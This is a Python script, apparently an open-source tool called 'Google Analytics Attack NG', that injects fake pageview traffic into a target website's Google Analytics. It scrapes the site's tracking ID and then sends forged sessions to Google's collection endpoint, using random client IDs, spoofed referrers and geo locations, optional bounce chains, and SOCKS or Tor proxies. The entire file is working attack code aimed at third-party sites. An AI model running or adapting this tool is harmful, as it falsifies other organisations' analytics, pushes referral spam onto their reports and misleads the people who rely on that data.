import sys
import requests #pip install requests[socks] to get socks for TOR
import re
import time
import random
import google
import logging
from Queue import Queue
from threading import Thread
import argparse
from urlparse import urlparse

#https://developers.google.com/analytics/devguides/collection/protocol/v1/
#https://developers.google.com/analytics/devguides/collection/protocol/v1/geoid

def main():
    ascii_art()
    global proxies
    global ignore_certs
    ignore_certs = False
    proxies = {
        # 'http': 'socks5://192.168.0.103:9100',
        # 'https': 'socks5://192.168.0.103:9100'
        #'http': 'http://192.168.0.107:8080',
        #'https': 'https://192.168.0.107:8080'
    }

    parser = argparse.ArgumentParser()
    parser.add_argument('-m','--mode',choices=['referral', 'google_keyword','organic'],help='required.',required=True)
    parser.add_argument('-v', '--verbose', help="increase output verbosity",action="store_true")
    parser.add_argument('--target_url',nargs='+', help='one or more URLs to target', metavar='')
    parser.add_argument('--referral_url',nargs='+', help='one or more URLs to refer traffic from',metavar='')
    parser.add_argument('-n','--number_of_sessions', help='required. total number of sessions to be emulated',metavar='',type=int)
    parser.add_argument('--threads', help='number of threads, aka concurrent sessions', default=1, type=int, metavar='')
    parser.add_argument('--referral_keyword', metavar='',help='keyword to retrieve referral URLs from Google')
    parser.add_argument('--referral_pool', metavar='', help='determines # of referral URLs to retrieve from Google based on referral_keyword',type=int,default=20)
    parser.add_argument('--geo_list', help='list of origin geo locations. \'criteriaID\' or \'criteriaIDs-criteriaIDs\'',metavar='',nargs='+')
    parser.add_argument('--user_delay', help='delay between users/threads', default=0, type=int, metavar='')
    parser.add_argument('--user_jitter', help='amount of randomness in user_delay', default=0, type=jitter_type, metavar='')
    parser.add_argument('--bounces', help='number of bounces between target pages',type=int,metavar='',default=0)
    parser.add_argument('--bounce_urls', help='specific URLs to bounce too. If not set, it will be auto-populated via Google Search',nargs='+',metavar='')
    parser.add_argument('--bounce_jitter',metavar='',help='amount of randomness in bounce URL selection',type=jitter_type,default=0)
    parser.add_argument('--bounce_pool',metavar='',help='determines # of URLs to retrieve from Google, if not proving bounce_urls',type=int,default=20)
    parser.add_argument('--session_delay',metavar='',help='amount of seconds between bounces in a session',type=int,default=0)
    parser.add_argument('--session_jitter',metavar='',help='amount of randomness in session_delay',type=jitter_type,default=0)
    parser.add_argument('--end_with',action="store_true",help='end with a bounce to target page')
    parser.add_argument('--proxy', help='use a HTTP or SOCKS proxy to make requests. note: google searches not included', metavar='')
    parser.add_argument('--ignore_certs', help='ignore ssl certs when making requests. note: google searches not included',action="store_true")
    args = parser.parse_args()

    if args.verbose:
        logging.basicConfig(level=logging.DEBUG)
    else:
        logging.basicConfig(level=logging.INFO)
        logging.getLogger("requests").setLevel(logging.WARNING)

    if args.proxy:
        if re.search("(socks5:\/\/.*:.)", args.proxy):
            logging.info("[+] Using a SOCK5 proxy: " + args.proxy)
            proxies['http'] = args.proxy
            proxies['https'] = args.proxy
        elif re.search("(http:\/\/.*:.)", args.proxy):
            logging.info("[+] Using a HTTP proxy: " + args.proxy)
            proxies['http'] = args.proxy
            proxies['https'] = args.proxy
        elif re.search("(https:\/\/.*:.)", args.proxy):
            logging.info("[+] Using a HTTPS proxy: " + args.proxy)
            proxies['http'] = args.proxy
            proxies['https'] = args.proxy
        else:
            logging.error('[-] Not a valid proxy definition.')
            sys.exit(1)

    if args.geo_list:
        args.geo_list=build_geo_list(args.geo_list)
    else:
        logging.info('[*] geo_list not provided. requests will randomize from US cities.')
        args.geo_list = build_geo_list(['1012873-1028514'])

    ignore_certs = args.ignore_certs



    if args.mode == 'referral':
        if not args.target_url or not args.referral_url or not args.number_of_sessions:
            logging.error('[-] target_url,referral_url, and number_of_sessions are required for referral attack')
            sys.exit(1)
        session = session_builder(target_url=args.target_url,mode=args.mode, referral_url=args.referral_url, bounce_urls=args.bounce_urls, bounces=args.bounces, bounce_jitter=args.bounce_jitter, session_jitter=args.session_jitter, session_delay=args.session_delay, end_with=args.end_with, bounce_pool=args.bounce_pool, geo_list=args.geo_list)
        thread_master(session=session, number_of_sessions=args.number_of_sessions, threads=args.threads, user_delay=args.user_delay, user_jitter=args.user_jitter)
    elif args.mode == 'google_keyword':
        if not args.target_url or not args.referral_keyword or not args.referral_pool or not args.number_of_sessions:
            logging.error('[-] target_url,referral_keyword, referral_pool, and number_of_sessions are required for google keyword')
            sys.exit(1)
        logging.info('[*] Referral URLs are needed.')
        referral_urls = []
        search_results = list(google.search(query=args.referral_keyword, num=args.referral_pool, stop=1))
        logging.info('[+] Grabbed %s referral URLs using Google', str(sum(1 for i in search_results)))
        for result in search_results:
            referral_urls.append(str(result))

        session = session_builder(target_url=args.target_url,mode=args.mode, referral_url=referral_urls, bounce_urls=args.bounce_urls, bounces=args.bounces, bounce_jitter=args.bounce_jitter, session_jitter=args.session_jitter, session_delay=args.session_delay, end_with=args.end_with, bounce_pool=args.bounce_pool, geo_list=args.geo_list)
        thread_master(session=session, number_of_sessions=args.number_of_sessions, threads=args.threads, user_delay=args.user_delay, user_jitter=args.user_jitter)

def build_geo_list(geo_list):
    list = []
    for item in geo_list:
        if '-' in item:
            min = int(item.split('-')[0])
            max = int(item.split('-')[1])
            list.extend(range(min,max))
        else:
            list.append(int(item))
    return list


def jitter_type(x):
    x = float(x)
    if not x <= 1 or not x >=0:
        raise argparse.ArgumentTypeError("jitter must be between 0 and 1.")
    return x



def thread_master(session, number_of_sessions, threads=1, user_delay=5, user_jitter=.50):
    session_queue = Queue()
    logging.info('[*] Queueing %s sessions.', str(number_of_sessions))
    for _ in range(number_of_sessions):
        session_queue.put("")
    logging.info('[*] Starting %s threads.', str(threads))
    for i in range(threads):
        worker = Thread(target=thread_worker, args=(i, session_queue, session, user_delay, user_jitter))
        worker.setDaemon(True)
        worker.start()
    logging.info('[*] Waiting for threads.')
    session_queue.join()
    logging.info('[+] Attack Complete.')

def thread_worker(i, q, session, delay=5, jitter=.50):
    while True:
        q.get()
        cid = session.random_unique_cid()
        geo_id = session.random_geo_id()
        logging.debug('[+] T' + str(i) + ': Starting a session. CID: ' + str(cid))
        behavior = session.run(client_id=cid,geo_id=geo_id)
        logging.info('[+] T' + str(i) + ': Session complete. CID: '+str(cid)+'. GEO_ID: '+str(geo_id)+' Behavior: '+behavior)
        time_delay = delay - random.randint(0, int(delay * jitter))
        logging.info('[*] T' + str(i) + ': Sleeping for '+str(time_delay))
        time.sleep(time_delay)
        q.task_done()

class session_builder:
    def __init__(self, target_url, referral_url,mode='referral', bounce_urls = None, session_delay=30, session_jitter=.50, bounces=0, bounce_pool = 20, end_with=False, tracking_id=None, geo_id='',bounce_jitter=.50,geo_list=None):
        self.target_url = target_url
        self.referral_url = referral_url
        self.mode = mode
        self.page_delay = session_delay
        self.page_delay_jitter = session_jitter
        self.geo_id = geo_id
        self.bounces = bounces
        self.bounce_urls = bounce_urls
        self.end_with = end_with
        self.used_cids = []
        self.client_id = self.random_unique_cid()
        self.tracking_id = tracking_id
        self.bounce_pool = bounce_pool
        self.bounce_jitter = bounce_jitter
        self.geo_list = geo_list

        #end_with logic
        if self.bounces == 0:
            self.end_with = False

        #get site url
        o = urlparse(self.target_url[0])
        self.target_site = o.scheme + '://'+ o.netloc

        #verify all urls from target list are same domain
        o = urlparse(self.target_url[0])
        match = o.netloc
        for target in target_url:
            o = urlparse(target)
            if not o.netloc == match:
                logging.error('[-] not all target_urls are from same site')
                sys.exit(1)

        #grabs tracking ID from target site.
        if self.tracking_id is None:
            logging.info('[*] trackingID not provided. attempting to automatically collect')
            page = requests.get(self.target_site,proxies=proxies,verify=(not ignore_certs))
            try:
                m = re.search("'(UA-(.*))',", page.text)
                self.tracking_id = str(m.group(1))
                logging.info('[+] trackingID found: ' + self.tracking_id)
            except:
                logging.error('[-] trackingID not found. target may not be running analytics')
                sys.exit(1)

        #if bounce urls are need, collects them.
        if self.bounces != 0 and self.bounce_urls is None:
            logging.info('[*] Bounce URLs are needed.')
            self.bounce_urls = []
            search_results = list(google.search(query="site:"+self.target_site, num=self.bounce_pool,stop=1))
            logging.info('[+] Grabbed %s bounce URLs using Google', str(sum(1 for i in search_results)))
            for result in search_results:
                self.bounce_urls.append(str(result))


    def random_unique_cid(self):
        unique = False
        while not unique:
            cid = random.randint(10000, 99999)
            if cid in self.used_cids:
                unique = False
            else:
                unique = True
                self.used_cids.append(cid)
                self.client_id = cid
        return cid

    def random_geo_id(self):
        return self.geo_list[random.randint(0,len(self.geo_list)-1)]


    def run(self,client_id=None,geo_id=None):
        if client_id is None or geo_id is None:
            logging.error('[-] Missing client_id or geo_id')
            sys.exit(1)
        pages = []

        selected_target = self.target_url[random.randint(0,len(self.target_url)-1)]
        selected_referral = self.referral_url[random.randint(0,len(self.referral_url)-1)]
        last_page = selected_referral
        pages.append(last_page)
        target_request = analytics_request(document_location=selected_target,document_referrer=last_page,client_id=client_id,tracking_id=self.tracking_id,geo_id=geo_id)
        target_request.send()
        pages.append('[T]'+selected_target)
        bounce_count = 0
        last_page = selected_target
        bounce_end = self.bounces - random.randint(0,int(self.bounces * self.bounce_jitter))
        while (bounce_count < bounce_end):
            delay = self.page_delay - random.randint(0,int(self.page_delay * self.page_delay_jitter))
            logging.debug('[*] Session sleep for %i seconds.', delay)
            time.sleep(delay)
            bounce_request = analytics_request(document_location=self.bounce_urls[random.randint(0,len(self.bounce_urls)-1)],document_referrer=last_page,client_id=client_id,tracking_id=self.tracking_id,geo_id=geo_id)
            bounce_request.send()
            pages.append(bounce_request.document_location)
            last_page = bounce_request.document_location
            bounce_count += 1

        if self.end_with:
            delay = self.page_delay - random.randint(0, int(self.page_delay * self.page_delay_jitter))
            logging.debug('[*] Session sleep for %i seconds.', delay)
            time.sleep(delay)
            target_request = analytics_request(document_location=selected_target, document_referrer=last_page, client_id=client_id,tracking_id=self.tracking_id,geo_id=geo_id)
            target_request.send()
            pages.append('[T]'+selected_target)

        behavior = ''
        for page in pages:
            behavior = behavior + page + ' => '

        return behavior[:-4]

class traffic_attack:
    def __init__(self,target_site,target_site_urls=None,target_site_keyword=None,tracking_id=None,target_site_url_pool=10,referral_urls=None, referral_keyword=None,referral_pool=20,bounce_urls = None, session_delay=30, session_jitter=.50, bounces=0, bounce_pool = 20):
        self.referral_urls = referral_urls
        self.referral_keyword = referral_keyword
        self.referral_pool = referral_pool
        self.target_site_urls = target_site_urls
        self.target_site_url_pool = target_site_url_pool
        self.target_site_keyword = target_site_keyword
        self.target_site = target_site
        self.bounce_urls = bounce_urls
        self.session_delay = session_delay
        self.session_jitter = session_jitter
        self.bounces = bounces
        self.bounce_pool = bounce_pool
        self.tracking_id = tracking_id

        if not self.referral_urls and not self.referral_keyword:
            logging.error('[-] Needs either a referral_url or keyword.')
            sys.exit(1)
        if self.referral_urls and self.referral_keyword:
            logging.error('[-] Needs either a referral_url or keyword. Not both.')
            sys.exit(1)
        if self.referral_keyword and not self.referral_pool:
            logging.error('[-] Needs referral pool.')
            sys.exit(1)

        if self.tracking_id is None:
            page = requests.get(self.target_site,proxies=proxies,verify=(not ignore_certs))
            try:
                m = re.search("'(UA-(.*))',", page.text)
                self.tracking_id = str(m.group(1))
            except:
                logging.error('trackingID not found. target may not be running analytics')
                sys.exit(1)

        if self.referral_keyword:
            logging.info('[*] Referral URLs are needed.')
            self.referral_urls = []
            search_results = list(google.search(query=self.referral_keyword, num=self.referral_pool, stop=1))
            logging.info('[+] Grabbed %s referral URLs using Google', str(sum(1 for i in search_results)))
            for result in search_results:
                self.referral_urls.append(str(result))

        if not self.target_site_urls:
            logging.info('[*] Target URLs are needed.')
            self.target_site_urls = []
            if not self.target_site_keyword:
                search_results = list(google.search(query="site:"+self.target_site, num=self.target_site_url_pool,stop=1))
            else:
                search_results = list(google.search(query="site:" + self.target_site + ' '+self.target_site_keyword, num=self.target_site_url_pool, stop=1))
            logging.info('[+] Grabbed %s target URLs using Google', str(sum(1 for i in search_results)))
            for result in search_results:
                self.target_site_urls.append(str(result))

        if self.bounces != 0 and self.bounce_urls is None:
            logging.info('[*] Bounce URLs are needed.')
            self.bounce_urls = []
            search_results = list(google.search(query="site:"+self.target_site, num=self.bounce_pool,stop=1))
            logging.info('[+] Grabbed %s bounce URLs using Google', str(sum(1 for i in search_results)))
            for result in search_results:
                self.bounce_urls.append(str(result))

    def run(self,client_id=None):
        count =0
        while count < len(self.target_site_urls):
            pages = []
            request = analytics_request(document_location=self.target_site_urls[count], document_referrer=self.referral_urls[random.randint(0,(len(self.referral_urls)-1))], client_id=client_id,tracking_id=self.tracking_id, geo_id='')
            pages.append(request.document_referrer)
            pages.append(self.target_site_urls[count])
            last_page = self.target_site_urls[count]
            request.send()
            count = count + 1
            bounce_count = 0

            while (bounce_count < self.bounces):
                delay = self.session_delay - random.randint(0,int(self.session_delay * self.session_jitter))
                logging.debug('[*] Session sleep for %i seconds.', delay)
                time.sleep(delay)
                bounce_request = analytics_request(document_location=self.bounce_urls[random.randint(0,len(self.bounce_urls)-1)],document_referrer=last_page,client_id=client_id,tracking_id=self.tracking_id,geo_id='')
                bounce_request.send()
                pages.append(bounce_request.document_location)
                last_page = bounce_request.document_location
                bounce_count += 1
            behavior = ''
            for page in pages:
                behavior = behavior + page + ' => '
            print(behavior[:-4])


def ascii_art():
    print("""
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
     Google Analytics Attack NG                         
            by ZonkSec                                  
__   __   __   __   __   __   .-. __   __ .-. __   __   
                             (o o)       (o o)          
                            \| O \/     \| O \/         
                              \   \       \   \         
                               `~~~'       `~~~'        
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Website:  https://zonksec.com
Twitter:  @zonksec
""")




class analytics_request:
    def __init__(self,document_referrer,document_location,client_id,tracking_id=None,version=1,hit_type='pageview',user_agent ='Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',geo_id ='US', anon_ip =1):
        self.version = version
        self.tracking_id = tracking_id
        self.client_id = client_id
        self.hit_type = hit_type
        self.user_agent = user_agent
        self.geo_id = geo_id
        self.document_referrer = document_referrer
        self.document_location = document_location
        self.anon_ip = anon_ip

        if self.tracking_id is None:
            logging.error('[-] trackingID not set.')
            sys.exit(1)

    def send(self):
        params = {}
        params['v'] = self.version
        params['tid'] = self.tracking_id
        params['cid'] = self.client_id
        params['t'] = self.hit_type
        params['aip'] = self.anon_ip
        params['dl'] = self.document_location
        if not self.document_referrer == '':
            params['dr'] = self.document_referrer
        params['geoid'] = self.geo_id
        params['ua'] = self.user_agent

        r = requests.post('https://www.google-analytics.com/collect', data=params,proxies=proxies,verify=(not ignore_certs))
        logging.debug('[*] Request Sent. ' + str(params))


main()